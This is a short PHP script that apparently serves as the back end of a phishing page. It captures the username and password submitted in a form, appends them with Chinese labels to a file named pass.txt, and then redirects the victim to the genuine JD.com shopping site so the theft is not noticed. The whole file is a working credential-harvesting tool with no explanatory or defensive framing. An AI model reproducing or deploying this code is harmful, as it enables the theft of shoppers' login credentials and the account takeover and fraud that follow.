<?php
$sniff = "用户名：".$_POST['user']."密码:".$_POST['keyed']."\n";
$key = fopen('pass.txt','a');
fwrite($key, $sniff);
fclose($key);
Header("Location: http://www.jd.com/");
?>